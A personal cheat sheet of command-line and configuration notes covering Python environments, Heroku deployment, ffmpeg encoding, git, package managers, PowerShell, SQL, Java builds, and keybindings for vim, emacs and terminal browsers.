

---------------------------------------------------------------------
python venv (virtual environment)
---------------------------------------------------------------------
- python3.7 -m venv foobar
- source foobar/bin/activate
	- fish : activate.fish
	- windows: ./venv/Scripts/activate
- deactivate: deactivate
- ubuntu + pip
	- python3 -m venv myvenv --without-pip
	- python -m ensurepip

---------------------------------------------------------------------
openssl localhost sign ssl cert (for https)
---------------------------------------------------------------------
- openssl req -nodes -new -x509 -keyout server.key -out server.cert
- common name must be localhost

---------------------------------------------------------------------
multipass (windows)
---------------------------------------------------------------------
- $env:MULTIPASS_SERVER_ADDRESS = 'localhost:5001'
- start daemon: multipassd -V info --address localhost:5001
- find images: multipass find
- list: multipass list
- shell: multipass exec foo -- shell --login
	- multipass shell foo

---------------------------------------------------------------------
express + create-react-app (yarn pnp setup)
---------------------------------------------------------------------
- express --view=pug foo
- cd foo
- add to package.json:
	"installConfig": {
		"pnp": true
	},
- yarn --use-pnp
- yarn create react-app client --use-pnp

---------------------------------------------------------------------
Preact + Parcel setup
---------------------------------------------------------------------
- yarn init -y
- yarn add preact
- yarn add -D parcel-bundler babel-preset-react babel-preset-env
- mkdir src
- touch src/index.html
- touch src/index.js
- touch .babelrc
- package.json <- scripts :
	- dev: parcel ./src/index,html
	- build: parcel build ./src/index.html
- .babelrc <- 
	presets : ["env"]
- {https://medium.com/dailyjs/lean-react-project-with-parcel-a6ffe0fac0d2}

---------------------------------------------------------------------
PIA (CLI -- openvpn)
---------------------------------------------------------------------
- install openvpn
- cd /etc/openvpn
- download file: https://www.privateinternetaccess.com/openvpn/openvpn.zip
- create pass.txt: 
	> username
	> password
- edit .ovpn file
	- edit line: auth-user-pass
		- change to: auth-user-pass pass.txt
- start: sudo -b openvpn foobar.ovpn

- {https://www.privateinternetaccess.com/helpdesk/guides/desktop/linux/linux-openvpn-terminal-connection}
- {https://www.privateinternetaccess.com/archive/forum/discussion/29286/manually-run-openvpn-inside-a-screen-terminal}

---------------------------------------------------------------------
postgresql sequelize nodejs
---------------------------------------------------------------------
- install:
	- npm install -g sequelize-cli
	- yarn add sequelize pg pg-hstore
- mkir db && cd db
- sequelize init
- edit config.json > insert into development:
	- "use_env_variable": "DATABASE_URL"
- export DATABASE_URL=our-database-url
- generate model:
	- sequelize model:create --name foo --atributes abc:string,abc:number
- migrate: sequelize db:migrate
- {https://bit.ly/2hpP7rY}

---------------------------------------------------------------------
curl with tor
---------------------------------------------------------------------
curl --socks5-hostname localhost:9050 https://check.torproject.org

---------------------------------------------------------------------
ffmpeg loop in backgound
---------------------------------------------------------------------
- nohup sh -c 'for i in *.mp4; do ffmpeg -i "$i" -c:v libx265 "${i%.*}_hevc.mp4"; done' &


---------------------------------------------------------------------
encoding
---------------------------------------------------------------------
- audio
    - opus
        - opusenc --bitrate 128 foo.flac foo.opus
    - aac
        - ffmpeg -i foo.flac -vn -c:a libfdk_aac -b:a 128k foo.m4a

---------------------------------------------------------------------
windows fix corrupted usb drive
---------------------------------------------------------------------
- chkdsk f: /f

---------------------------------------------------------------------
bluetoothctl
---------------------------------------------------------------------
- steps
    - default-agent
    - power on
    - scan on
    - pair 00:11
    - connect 00:11

---------------------------------------------------------------------
virtualbox mount
---------------------------------------------------------------------
- sudo mount -t vboxsf MEGA ~/shared/MEGA
- to access shared directory (add user to vbox usergroup)
  - sudo adduser $USER vboxsf

---------------------------------------------------------------------
install xfce themes
---------------------------------------------------------------------
- cp -r axiomd ~/.local/share/themes

---------------------------------------------------------------------
windows setup C/C++ compiler 
---------------------------------------------------------------------
- "c:\Program Files (x86)\Microsoft Visual Studio 14.0\VC\vcvarsall.bat" x64

---------------------------------------------------------------------
start/restart xfce network applet
---------------------------------------------------------------------
nm-applet
- start: nm-applet &
- kill: killall nm-applet

---------------------------------------------------------------------
mapscii : map inside the terminal
---------------------------------------------------------------------
- telnet mapscii.me

---------------------------------------------------------------------
Far Manager commands
---------------------------------------------------------------------
- change panels: tab
- quick view: Ctrl+Q
- view directory size: F3
- sync panels: cd CTRL+SHIFT+]
- install addons:
    - copy file to profile addons directory
    - addons dir : AppData/Roaming/Far Manager/Profile/Macros/scripts/
- select multiple files: shift + up/down arrow key
    - INS key
    - 
- faster navigation: hold ALT + first letter of file name

---------------------------------------------------------------------
downme.xyz cli commands
---------------------------------------------------------------------
- upload:
    - curl -X PUT www.downme.xyz/api/file -F "=@foo.txt"
    - windows : curl -X PUT www.downme.xyz/api/file -F file=@nohup.out
- download: 
    - curl www.downme.xyz/api/file/FqigXPc8wD -o foo.txt

---------------------------------------------------------------------
windows start hosted wifi
---------------------------------------------------------------------
- netsh wlan set hostednetwork mode=allow ssid=foo key=bar
- netsh wlan start hostednetwork

---------------------------------------------------------------------
stardog
---------------------------------------------------------------------
- start server
    - windows :
        - set STARDOG_HOME=C:\data\stardog
        - stardog-admin.bat server start
    - ./stardog-admin server start
- create db with input file
    - windows:
        - stardog-admin.bat db create -n myDB data.ttl
- namepspaces
    - add:
        - windows: stardog.bat namespace add test2 --prefix uni --uri http://www.abc.xyz/uni#
    - remove:
        - windows: stardog.bat namepsace remove test2 --prefix uni

---------------------------------------------------------------------
ffmpeg add overlay
---------------------------------------------------------------------
- find video scale : ffmpeg -i in.mp4 2>&1 |grep Video: | sed 's_.*, \([0-9]*x[0-9]*\) .*_\1_' | awk 'BEGIN {FS="x"} {print int($1/20)"x"int($2/20)}'
- ffmpeg -i in.mp4 -i icon-BGtransparent.png -filter_complex "[1:v] scale=96x54 [logo1]; [0:v][logo1] overlay=0:0" -c copy out.mp4
- overlay: ffmpeg -i in.mp4 -i overlay.png -filter_complex "overlay=10:10" out.mp4
    - with opacity: 
        - ffmpeg -i in.mp4 -i overlay.png -filter_complex "[1]geq=r='r(X,Y)':a='0.3*alpha(X,Y)'[a];[0][a]overlay=10:10" out.mp4

---------------------------------------------------------------------
ffmpeg trim/cut part of the videos
---------------------------------------------------------------------
- ffmpeg -ss 00:01:01.000 -i in.mp4 -t 03:18:00.000 -c copy out.mp4
- {http://bit.ly/2FGq0xe}

---------------------------------------------------------------------
ffmpeg download m3u8 videos
---------------------------------------------------------------------
-  ffmpeg -i "http://foo.bar/test.m3u8" -bsf:a aac_adtstoasc -vcodec copy -c copy -crf 50 out.mp4
- {https://gist.github.com/tzmartin/fb1f4a8e95ef5fb79596bd4719671b5d}

---------------------------------------------------------------------
run linux like commands (GNU utils) in powershell
---------------------------------------------------------------------
- cash

---------------------------------------------------------------------
deploy to heroku
---------------------------------------------------------------------
- git init
- echo node_modules > .gitignore
- git add .
- git commit -m "Initial commit"
- heroku create
- git push heroku master
	- git push -u heroku


update new heroku remote name
- git remote rm heroku
- heroku git:remote -a newname

teams
- heroku teams
- apps in teams: heroku apps -t thinkcol


Logs
- heroku logs
- heroku config:set NPM_CONFIG_LOGLEVEL=verbose
- heroku logs --app appname --tail

fix babel
- "start": "./node_modules/.bin/babel-node ./server/index.js",
- heroku config:set NPM_CONFIG_PRODUCTION=false

restart
- heroku restart


docker
- heroku container:login
- heroku create
- heroku container:push web -a foobar
- heroku container:release web -a foobar

- heroku apps:rename newname --app oldname
- heroku git:remote -a app-name
- git push -u heroku
- heroku open
- heroku logs --tail

rename
- heroku apps:rename foobar
- heroku apps:rename newname --app oldname

update
- heroku update

certs
- heroku certs:auto

---------------------------------------------------------------------
go-lang packages
---------------------------------------------------------------------
- install : go get github.com/foo/bar
- update: go get -v -u github.com/foo/bar

---------------------------------------------------------------------
case insensitive search in less 
---------------------------------------------------------------------
LESS=-Ri

---------------------------------------------------------------------
curl - sending requests
---------------------------------------------------------------------
POST
- curl --data "param0=a&param1=b" httpbin.org/post

DELETE
- curl -X DELETE http://www.url.com/page

---------------------------------------------------------------------
query online 
---------------------------------------------------------------------
cli.fyi
- bitcoin: http -b cli.fyi/btc
    - GBP: http -b cli.fyi/btc |grep GBP
- IP address info: http -b cli.fyi/104.238.168.65
- domain whois/info: http -b cli.fyi/google.com
- my info : http -b cli.fyi/me
- time : http -b cli.fyi/time
- programming language links: http -b cli.fyi/java
- country info: http -b cli.fyi/united-kingdom
- emojis: http -b cli.fyi/emojis
- check email address info: http -b cli.fyi/john.doe@gmail.com
- check media/URL info: http -b cli.fyi/"https://vimeo.com/231191863"
- {https://cli.fyi/}

- http://zx2c4.com/ip

weather
- wttr.in : http -b wttr.in

get my public IP
- api.ipify.org: http -b api.ipify.org

news
- getnews.tech/amazon

---------------------------------------------------------------------
ArchLinux Manual Build + Install
---------------------------------------------------------------------
- install build essentials
- download pkgbuild 
- make package
    - makepkg
- make + install
    - makepkg -si
- install
    - sudo pacman -U x.pkg.tar.xz


- check dependencies: 
    - pacman -Qi qt
    - pacman -Sii qt


http://bit.ly/2ALaxWq

---------------------------------------------------------------------
create git repository
---------------------------------------------------------------------
- create local git repo
    - mkdir foobar
    - cd foobar
    - git init
- check status : git status
- add files to staging environment
    - git add
    - stages modified and deleted without new
        - git add -u
    - stages new and modified without deleted
        - git add .
- commit: git commit -m "message about commit"
- push repo:
    - add remote origin: git remote add origin https://foo.git
    - push: git push -u origin master
    - mirror: git push --mirror repo2
    - all : git push --all repo2
- git config
    - set email: git config --local user.email foo@bar
        - check email: git config --local user.email
- see git remote url : git remote -v
- change git remote url: git remote set-url origin https://github.com/USERNAME/REPOSITORY.git
    

http://product.hubspot.com/blog/git-and-github-tutorial-for-beginners

---------------------------------------------------------------------
qutebrowser libqt5webengine workaround
---------------------------------------------------------------------
sudo execstack -c /usr/lib/libQt5WebEngineCore.so.5
execstack -q /usr/lib/libQt5WebEngineCore.so.5

---------------------------------------------------------------------
Powershell
---------------------------------------------------------------------
- powershell version: $PSVersionTable.PSVersion
- check if using cmd or powershell: 
    - (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
- return profile path: $PROFILE
- reload profile :    . $PROFILE
- refresh environment variables: refreshenv
- change security protocol: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
- services
	- change startup type: Set-Service ssh-agent -StartupType Manual
	- service status: Get-Service ssh-agent
	- start: Start-Service ssh-agent
- SSH
	- start openssh :
		- Install-Module -Force OpenSSHUtils -Scope AllUsers
		- Start-Service ssh-agent
		- Start-Service sshd
	- gen key: ssh-keygen
	- load key to ssh-agent: ssh-add ~/.ssh/key
- web request tls
	- [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
- modules
	- list installed
		- all installed on computer: Get-InstalledModule
		- installed + imported : Get-Module
	- update all installed: Get-InstalledModule | Update-Module
	- install latest: Install-Module -Name Foobar -AllowPrerelease
- curl/iwr
	- get content:
		- (curl cli.fyi/me).Content
- help : get-help curl
- touch (create empty file): echo $null >> foo.txt
- see processes (like top):
	- cpu time : ps | sort -des cpu | select -f 15
	- memory: ps | sort -des ws
- exec using wsl: wsl -e ls
- exec using wsl bash: bash -c ls
- ports/connections : netstat -a
	- localhost: netstat -ano
- restart wsl: Restart-Service LxssManager
- change UI title : $Host.UI.RawUI.WindowTitle = "foobar"
- install msix: Add-AppxPackage PowerShell-7.0.1-win-x64.msix
- fix clipboard: echo off | clip
- background jobs: nvim . &
	- list jobs: Get-Job
	- stop job: Stop-Job Job1
	- remove job: Remove-Job Job1

---------------------------------------------------------------------
yarn
---------------------------------------------------------------------
install global packages
- yarn global add create-react-app@next

update global packages
- yarn global upgrade
- yarn global upgrade-interactive
- specific package: yarn global add <package>@latest

ignore engines
- yarn --ignore-engines

list installed global packages
- yarn global list

update all packages
- yarn upgrade --latest

use pnp
- yarn --use-pnp
- cra : yarn create react-app test --use-pnp
- install: yarn --use-pnp
- add inside package.json : 
	"installConfig": {
		"pnp": true
	},

---------------------------------------------------------------------
ruby gems
---------------------------------------------------------------------
check outdated gems: gem outdated
update installed gems: gem update
update gem: gem update --system
cleanup: gem cleanup

---------------------------------------------------------------------
pip
---------------------------------------------------------------------
python 3 version: python3 -m pip install humanize

pip install to local dir
- pip install foobar -t ./

list outdated packages
- pip3 list -o


update all
- pip3:   pip3 install -U $(pip3 freeze | awk '{split($0, a, "=="); print a[1]}')
- pip:   pip install -U $(pip freeze | awk '{split($0, a, "=="); print a[1]}')
- powershell : pip list --outdated --format=freeze | %{$_.split('==')[0]} | %{pip install --upgrade $_}

uninstall
- pip uninstall package

---------------------------------------------------------------------
chocolatey
---------------------------------------------------------------------
Upgrade: choco upgrade chocolatey
list outdated pkgs: choco outdated
upgrade all pkgs: cup all -y    || or || choco upgrade all
list all pkgs: choco list -lo
uninstall pkg: choco uninstall foo -y --remove-dependencies

---------------------------------------------------------------------
npm
---------------------------------------------------------------------
check latest
- npm show react version
- npx npm-check-updates
	- npm install -g npm-check-updates && ncu
- rebuild (recompile binaries) : npm rebuild

- update all to latest version
	- npx npm-check-updates -u
	- bleeding edge: npx npm-check-updates@latest --pre -n -u

check installed version
- npm view react version
- list all: npm list -g --depth=0

check outdated packages
- npm outdated
- global: npm outdated -g
    - npm outdated -g --depth=0

update all outdated global packages
- npm update -g

uninstall 
- global package : npm -g uninstall <name> --save

update npm 
- npm install -g npm@latest
- windows
    - npm install --global --production npm-windows-upgrade
    - npm-windows-upgrade --npm-version latest
- publish : npm publish
- bump version: npm version patch

---------------------------------------------------------------------
reinstall nodejs
---------------------------------------------------------------------
uninstall
- sudo apt-get purge nodejs
- sudo apt-get purge --auto-remove nodejs
- sudo rm -rf /usr/local/lib/node_modules
- sudo rm -rf ~/.npm

---------------------------------------------------------------------
curl with http2
---------------------------------------------------------------------
- install
sudo apt-get install build-essential nghttp2 libnghttp2-dev 

wget https://curl.haxx.se/download/curl-7.54.0.tar.bz2

tar -xvjf curl-7.54.0.tar.bz2

cd curl-7.54.0

./configure --with-nghttp2 --prefix=/usr/local

make

sudo make install

sudo ldconfig

- use curl
-  /usr/local/bin/curl --http2 -I https://google.com

---------------------------------------------------------------------
nodejs (expressjs) setup
---------------------------------------------------------------------
npm init -y

./server/index.js
import express from 'express';



const app = express();

const port = 3000;





app.get('/*',(req,res)=>{

    res.send('Hello world');

});



app.listen(port,()=>console.log('Running on localhost:'+port));


npm install --save-dev babel-cli babel-preset-env

npm install --save express

.babelrc
{

  "presets": ["env"]

}


package.json
"server": "nodemon --watch server --exec babel-node -- server/index.js",





npm install --save-dev
yarn add --dev



npm run server



express-generator
- npm install -g express-generator
- express --view=pug helloworld
- cd helloworld && npm install
- DEBUG=helloworld:* npm start

------------- LINKS -------------

https://babeljs.io

http://zae.bz/fbyPSY

---------------------------------------------------------------------
magento
---------------------------------------------------------------------
fix pub css/js 
- php bin/magento setup:static-content:deploy -f
- php bin/magento setup:static-content:deploy en_GB

reindex 
- php bin/magento indexer:reindex

check modules
- php bin\magento module:status

enable module
- php bin\magento module:enable LiveChat_LiveChat

update/upgrade modules
- php bin\magento setup:upgrade

recompile modules
-  php bin\magento setup:di:compile

clear cache
- php bin/magento cache:clean
- php bin/magento cache:flush

---------------------------------------------------------------------
composer
---------------------------------------------------------------------
update/install ignoring base dependencies
- composer install --ignore-platform-reqs

---------------------------------------------------------------------
mongodb
---------------------------------------------------------------------
start:  net start MongoDB
stop:   net stop MongoDB

shell :  mongo
list db:  show dbs
use db:  use foo

---------------------------------------------------------------------
ffmpeg concat videos
---------------------------------------------------------------------
- https://www.youtube.com/watch?v=1Xf1DfvVJbs

- C:\Users\austin\Desktop\New folder>(for %i in (*.mp4) do @echo file '%i') > mylist.txt
    - for f in ./*.wav; do echo "file '$f'" >> mylist.txt; done
- C:\Users\austin\Desktop\New folder>ffmpeg -f concat -safe 0 -i mylist.txt -c copy output.mp4
- concat multiple MTS into a single mp4
  - ffmpeg -i "concat:00019.MTS|00020.MTS|00021.MTS|00022.MTS" output.mp4


---------------------------------------------------------------------
windows force high dpi support
---------------------------------------------------------------------
/high-dpi-support=1 --force-device-scale-factor=1



/high-dpi-support=1 /alt-high-dpi-setting=96

--high-dpi-support=1 /force-device-scale-factor=1


atom: --force-device-scale-factor=1

---------------------------------------------------------------------
redhat openshift
---------------------------------------------------------------------
params:
- nodejs-mongo-persistent
- openshift
- mongodb
- sampledb

cli tools
- oc login https://api.starter-us-east-1.openshift.com
oc project test-node-proj
oc status

---------------------------------------------------------------------
javascript
---------------------------------------------------------------------
syntax
- 3 dots
    - function App1() {
      return <Greeting firstName="Ben" lastName="Hector" />;
    }
    - function App2() {
      const props = {firstName: 'Ben', lastName: 'Hector'};
      return <Greeting {...props} />;
    }

- ? and :
    - ? = value if true
    - : = value if false
    - (e.g.
        - hsb.s = max != 0 ? 255 * delta / max : 0;
        EQUIVALENT TO 
        - if(max!=0){hsb.s = 255*delta/max}
        - else{hsb.s=0}
        
- shorthands
    -  LONGHAND
    if(x){
    y()
    }

    - SHORTHAND
    x && y();
    -----------------------------------------------


    - LONGHAND
    if (x > 10) {
        answer = 'is greater';
    } else {
        answer = 'is lesser';
    }

    - SHORTHAND
    const answer = x > 10 ? 'is greater' : 'is lesser';


    -------------------------------------------------
    - LONGHAND
    function sayHello(name) {
      console.log('Hello', name);
    }


    - SHORTHAND
    sayHello = name => console.log('Hello', name);

    ---------------------------------------------------

    - LONGHAND
    setTimeout(function() {
      console.log('Loaded')
    }, 2000);



    - SHORTHAND
    setTimeout(() => console.log('Loaded'), 2000);

    ------------------------------------------------------
    - LONGHAND
    list.forEach(function(item) {
      console.log(item);
    });

    - SHORTHAND
    list.forEach(item => console.log(item));
    -----------------------------------------------------
    - LONGHAND
    if (variable1 !== null || variable1 !== undefined || variable1 !== '') {
         let variable2 = variable1;
    }

    - SHORTHAND
    const variable2 = variable1  || 'new';

    ------------------------------------------------------




---------------------------------------------------------------------
SQL 
---------------------------------------------------------------------
- mysql 
    - run: mysql -u root -p
    - use DB: USE DBName;
    - rename table:  RENAME TABLE `Stu Table` TO `Stu Table_10`;
    - alter: ALTER TABLE `xyz` CHANGE `manufacurerid` `manufacturerid` INT;
    - export sql: mysqldump -u YourUser -p YourDatabaseName > wantedsqlfile.sql
    
- postgresql
    - login : psql -U postgres
        - psql -U Username DatabaseName 
    - logout or quit :  \q
    - list all users: \du
    - list all db :  \l
    - switch db:  \connect database_name
    - list all tables :  \dt
    - list all columns : \dt+ users
    - table structure: \d+ "users"
    - create database: create database "foo-bar";
    - grant all privileges: grant all privileges on database <dbname> to <username> ;
    - reset AutoIncrement :  ALTER SEQUENCE product_id_seq RESTART WITH 1453
        - (table name = product, column name = id)

- truncate
    - TRUNCATE TABLE `thinkcol`.`upload_original`;



- create table:
    - CREATE TABLE Employees
        (
           id INT NOT NULL,
           age INT NOT NULL,
           first VARCHAR(255),
           last VARCHAR(255),
           PRIMARY KEY ( id )
        );
- add primary key + set auto_increment(id):
    - ALTER TABLE `users` ADD `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY
    
- delete from multiple columns
    - DELETE FROM orders;
    - DELETE FROM invoice;

---------------------------------------------------------------------
sncli
---------------------------------------------------------------------
help: -h
quit : q
up: k
down: j
fullsync: S
create note: C
edit: e
tags: t
trash: T
search: /
- by tag:   /tag:foo

---------------------------------------------------------------------
java
---------------------------------------------------------------------
generate javadocs
- only public = javadoc -d javadocs/ *.java
- all  = javadoc -private -d javadocs/ *.java

create jar file
- jar -cvfm example.jar manifest.txt com/mkyong/awt/*.class

compile java with other jar
- javac -cp '.:foo.jar' bar.java
- java -cp jar1:jar2:jar3:dir1:. HelloWorld
    - multiple jars : java -cp .:file1.jar:file2.jar:file3.jar bar
- run with: java -cp .:foo.jar bar

relational algebra interpreter
java -cp aql.jar edu.gsu.cs.ra.RA db

TIPS:
- when to use static
    - make sense to call this method even no Obj constructed
        - if yes -> static
    - never be changed/overridden

Pack Jar
- jar -cvfm foo.jar manifest.mf *.class *.jar bar
    - foo.jar is the name of the jar
    - bar is a folder
    -  manifest.mf
        - Manifest-Version: 1.0
          Created-By: Austin
          Class-Path: commons-io-2.5.jar commons-lang3-3.5.jar
          Main-Class: foobar

sign jar
- keytool -genkey -keystore testKeys -alias jdc
- jarsigner -keystore testKeys TestJnlp.jar jdc


increase stack size
- java -Xss50m foo
- java -Xmx256M -jar MyApp.jar

compile files in multiple subfolders
- go to top level of package
- dir /b /s *.java >> files.txt
-  javac @files.txt

compile to dir
- javac -d ../build/classes org/example/antbook/lesson1/Main.java
- javac -d [where to compile] [what to compile]


ant 
- build run file
    - if build.xml exists (default)
        - ant
        else
        - ant -f strutured.xml

        to clean (deletes build and dist directories)
        - ant clean 

        build in verbose mode
        - ant -v

        executing class file
        - java -cp build/classes/ org.example.antbook.lesson1.Main a b



        (projecthelp/see descriptions)
        ant -f mybuild.xml -projecthelp

Junit
- testing src code file: test\org\example\antbook\junit\SimpeTest.java
- build directory: build/test

- to compile
    - javac -cp junit-4.12.jar -d build/test/ test/org/example/antbook/junit/SimpleTest.java

- to run
    - java -cp build/test:junit-4.12.jar:hamcrest-core-1.3.jar org.junit.runner.JUnitCore org.example.antbook.junit.SimpleTest

---------------------------------------------------------------------
tlp check
---------------------------------------------------------------------
sudo tlp-stat -s 

---------------------------------------------------------------------
update wps-office (linux)
---------------------------------------------------------------------
sudo apt-get remove wps-office
sudo apt-get purge wps-office

---------------------------------------------------------------------
CMD
---------------------------------------------------------------------
- taskkill
    - Taskkill /F /IM abc.exe
        - /F /pid 

---------------------------------------------------------------------
remove highlight of last search in less
---------------------------------------------------------------------
Alt+u

---------------------------------------------------------------------
w3m
---------------------------------------------------------------------
shift screen by one line: K,J
back:  B
reload: R
open new in tab: C-t
new tab: T
cycle tabs: { and }
tab selection menu: ESC+t
view image: I
peek image URL: i
close tab: C-q
add bkmark: ESC-a
view bkmark: ESC-b
quit: Q
download: a
next link: Tab
prev link: C-u / ESC Tab
search: /
    - next: n
    - prev: N
peek link url: u
goto url: U
- clear line : C-u
peek url: c
download/save link: a
download image: ESC-I
view source: v
options: o
view version: r
run shell command: !
document info: =
show all links and images: L
popup link list: ESC-l
close popup: C-c
dowloads : D
buffer selector: s
mark word as anchor: ;
first link: [
last link: ]
center curr line: z
history: C-h
view youtube vids in mpv: shift-M
- external browser: mpv -ytdl --vo=opengl --ao=alsa
- https://www.reddit.com/r/commandline/comments/6ixptv/open_current_w3m_video_site_url_with_mpv_the_easy/

{ http://pygy.co/gM || https://github.com/janosgyerik/cheatsheets/wiki/W3m-cheat-sheet }

---------------------------------------------------------------------
elinks
---------------------------------------------------------------------
goto URL: g
top of page: HOME
bottom of pag: End
search: /
- # -> /
new tab: t
open link in newtab: T
close tab: c
move tab L/R:  <>
bookmark: s
options: o
download (save as) current link: d
download manager: D
quit: q
get header: |
get doc raw html: \
get doc info: =

re-written config
- goto url : o
- peek url : O
- close tab: q
- scroll : vim
- next link: J
- prev link: K
- back page: H
- go forward: L
- top of page: g
- bottom of page: G
- quit: Q
- {https://github.com/minimul/dotfiles/blob/master/.elinks/elinks.conf}


---------------------------------------------------------------------
i3wm
---------------------------------------------------------------------
(mod = windows key)
- terminal : mod+enter
- exit: mod+shift+q
- toggle fullscreen: mod + f
- window mode: mod+w
- stack mode: mod+s
- tiling mode: mod+e
- horizontal tiling: mod + h
- vertical tiling: mod + v
- scroll window: mod + arrowkeys
- switch window : mod + shift + arrowkeys
    - left/right: mod+j
    - up/down: mod+k
- dmenu: mod+d
- bmenu: mod+ctrl+b
- morc_menu: mod+z
- exit: mod+0
- help: mod+shift+h
- toggle floating: mod+shift+space
- change workspace: mod+numbers
    - mod+ctrl+arrows
- move window to different workspace: mod+shift+numbers
- logout: mod + shift + e
- move/drag: mod+drag
- alsamixer [*manjaro i3*] : mod + ctrl + m
- toggle focus (tiling/float): mod + space
- toggle window (tiling/float): mod + shift + space
- lock/logout : mod + 0
- auto hide bottom status bar: mod + m
- reload config: win + shift + r

---------------------------------------------------------------------
emacs
---------------------------------------------------------------------
- run in CMD : emacs ret -nw
- quit: C-x C-c
- cut: C-w
- copy : M-w
- paste : C-y
- select all: C-x h
- list buffer: C-x C-b
- kill buffer: C-x-k
- find and replace "foo" with "bar"(fullword) :     :%s/\<foo\>/bar/g
    - (nonfullword):   :%s/foo/bar/g
- load/new file:  C-x C-f
- save: C-x C-s
- split screen :   C-x y  (e.g. C-x 2)
    - Y=0 : close active window
    - 1: close all except active window 
    - 2: split Vertically     ---------
    - 3: split horizontally      |
    - o : next window
    - switch buffer :b
- compile : M-x  -> compile   -> javac xxx.java
- undo : C-/
- cancel command: C-g
- execute java(debug): M-x  jdb
-  erase buffer: M-x erase-buffer
    -(or) C-x h   -> C-w
- run shell command: M-!
- tabs : C-T and C-D
- reload configs : M-x eval-buffer
- list buffers: :ibuffer
- neotree
    - go up a dir: U
    - {https://www.emacswiki.org/emacs/NeoTree}

---------------------------------------------------------------------
Doom Emacs
---------------------------------------------------------------------
- enable modules:
    - edit init.el
    - doom re
- treemacs : spc o p
- edit config : spc f p
- reload init.el: spc h r r

---------------------------------------------------------------------
onivim2
---------------------------------------------------------------------
- hover info: g h
- type definition: g d

---------------------------------------------------------------------
lunarvim
---------------------------------------------------------------------
- start: lvim
- edit config: SPC + L + c
- toggle explorer: spc + e
- toggle hover: shift + k
- go to declaration file: gd
- close buffer: spc + c
- quickfix: spc + l + q
- code action: spc + l + a
- diagnostics:
    - previous: spc + l + k
    - next: spc + l + j
    - document diagnostics: spc + l + d
    - view line diagnostics: gl
- ctrl+e: copilot
- ctrl+\: popup terminal
    - enter normal mode(for scroll): c+\ ctrl+n
        - back to insert mode: i
    - exit: ctrl+d
- peek definition: gp
- go to definition: gd
- go to buffer: spc + b + j + <LETTER>
- next tab : shift + l
- previous tab: shift + h
- wipeout buffer (except current) : spc + b + e
- resize window: ctrl + (up/down/left/arrow) key
- move to buffer: ctrl + h,l,j,k
- git blame: spc g l
- install LSP for a language:
    - LspInstall typescript
    - {https://github.com/kabouzeid/nvim-lspinstall}
- Update:
  - LvimUpdate
  - PackerUpdate / PackerSync
- NVIMTree
    - file info: ctrl+k
    - toggle hidden folders: shift + i
    - toggle dotfiles: shift + h
    - refresh tree: shift + r
    - rename: r
    - add file: a
    - delete file: d
    - open in split
     	- horizontal split (----) : ctrl + x
	- vertical split (|) : ctrl + v
    - {https://github.com/kyazdani42/nvim-tree.lua}
---------------------------------------------------------------------
vim
---------------------------------------------------------------------
- copy = yy 
    - multiple lines:  V (select lines) -> yy
    - ctrl+INSERT
- paste = pp
    - across terminal: "*p
    - shift+INSERT
- file explorer tree = :Explore
    - (quit = :bd)
    - create file: %
- vertical slit= :vsplit                  |
- horizontal split= :split          -----
- resize:
	- increase width: C-w >
	- reduce width: C-w <
	- increase height: C-w +
	- reduce height: C-w -
- move window:
	- far right: C-w L
	- far left: C-w H
	- far bottom: C-w J
	- far top: C-w K
- rotate window:
	- up/left: C-w R
	- down/right: C-w r
- close window = :hide
- cylce through window = C-w
- keep only this window open = :only
- show current buffer = :ls
- undo = u
- redo= C-r
- save = :w
    - only part of file :  :529,533 w foo.txt
    - sudo save:  :w !sudo tee %
- save&quit = :x
- open another file= :e
- switch buffer= :b
- new tab = :Te
- next tab = gt
- prev tab = gT
- cycle to tabs: ALT + number
	- ALT + left or right
- close tab = bd
- tabs to 4 spaces
	- filetype plugin indent on
	- set sw=4 sts=4 et
	- all tabs to spaces: %retab
- guifont selector: set guifont=*
- search: / 
    - whole word :  /\<word\>
- remove(^M) : %s/\r/\r/g
- remove newlines: shift+j
    - 3+shift+j
- install plugins :
    - cd ~/.vim/bundle && \
git clone xxx.git
- move to 
    - end of line: $
    - beginning of line : 0
    - line 42 : 42gg
    - end of file: G
    - top of file: gg
- multiple lines comment: ctrl+v (select lines)
	- ctrl+q (mswin.vim)
    - shift + i + # + ESC 
    - (FOR REMOVING) : x
    - when mapped: ctrl+q (neovim)
- replace ^M linebreaks
    - :%s/<Ctrl-V><Ctrl-M>/\r/g
- substitute :  :s
    - all lines :    :%s/old/new/g
    - 1st occurence :   :s/foo/bar
    - every occurence :s/foo/bar/g
    - specific lines :    :478,480s/old/new/g
- find no. of matces: :%s/pattern//gn
- fix broken syntax highlight: syntax sync fromstart
- NERDTree : Ctrl+n
    - vertical split |  : s
    - horizontal split ---- : i
    - menu : m
    - change dir:   :NERDTreeFind 
        - C
    - show hidden files:   SHIFT+i
- Buffergator:   \b
    - open in new vertical |   : Ctrl+v
    - open in new horiz ----- :   Ctrl+S
    - open in new tab  : Ctrl+T
    - delete buffer: d
- resize:
    - dec height:  ctrl + w + -
    - same height:  ctrl + w + =
    - width 
        - ctrl + w +  (>   or   <)
- move window (ctrl+w) + :
    - right : L
    - left: H
    - bottom: J
    - top: K
- rotate windows (Ctrl+w) + :
    - up-left : R
    - down/right: r
- matching parenthesis : 
    - place cursor on any (,[,{ 
    - %
- external command :   :! 
- insert contents to file:   :r filename
- new line:
    - below cursor : o
    - above cursor: O
- append text to end of line:  A
- replace: R
- reload file:   :edit
    - force reload:  :edit!
- change directory to file:    :cd %:p:h    
- folds
    [all] : capital letter(2nd letter)
    - open : zo
    - close: zc
- clear background buffers:  :call Wipeout()
- autocomplete : ctrl + n
- vundle:
    - install: PluginInstall
    - update: PluginUpdate
    - cleanup: PluginClean
- move screen up: C-y
- move screen down: C-e
- fix windows carriage return : :%s/^M/\r/g
- remove all empty lines: :g/^$/d
- page scrolling:
  - up 1 line: ctrl+y
  - down 1 line: ctrl+e
  - up half page: ctrl+u
  - down half page ctrl+d
- remove search highlight:  :noh


Vimperator
- http://sheet.shiar.nl/vimperator
- open: o
- newtab: t
- open in new tab: T
- select link:
    - (quick hint mode) : f  -> enter number
        - (open in new tab) : F
- save link:    ;s
- check info of link:  ;?
- forward: L  or  alt + ->
- backward: H  or  alt + <-
- add bookmark: a
- clean searchhighlight: noh
- select text: 
    - use / to find word and n to go to location
    - c to move around 
    - v to select then y to yank
- view source: gf
- copy url: y
- reopen closed tab: C-Shift-T  or u
- change url: O
